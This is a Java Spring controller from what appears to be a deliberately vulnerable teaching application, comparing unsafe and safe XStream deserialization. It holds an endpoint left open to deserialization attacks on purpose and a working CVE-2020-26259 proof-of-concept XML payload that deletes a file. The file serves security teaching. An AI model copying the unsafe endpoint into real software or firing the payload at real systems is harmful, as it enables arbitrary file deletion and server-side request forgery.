package com.best.hello.controller.ComponentsVul;

import com.thoughtworks.xstream.XStream;
import io.swagger.annotations.Api;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * XStream是一个简单的基于Java库，Java对象序列化到XML
 *
 * @date 2021/08/16
 */

@Api("Xstream反序列化漏洞")
@RestController
@RequestMapping("/vulnapi/XStream")
public class XStreamVul {

    @RequestMapping("/vul")
    public String vul(@RequestBody String content) {
        XStream xs = new XStream();
        xs.fromXML(content);
        return "XStream Vul";
    }

    @RequestMapping("/safe")
    public String safe(@RequestBody String content) {
        XStream xs = new XStream();
        // 修复：1.4.10后可用，启用默认安全配置
        XStream.setupDefaultSecurity(xs);

        // xs.addPermission(NoTypePermission.NONE);
        xs.fromXML(content);
        return "XStream Safe";
    }


    /**
     * CVE-2020-26259 任意文件删除/SSRF
     * 影响 1.4.15以下
     */
    public static void main(String[] args) {
        String xml_poc = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>\n" +
                "              <tempFile>/tmp/abc</tempFile>\n" +
                "            </is>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";

        XStream xs = new XStream();
        // XStream.setupDefaultSecurity(xs);

        xs.fromXML(xml_poc);
    }


}
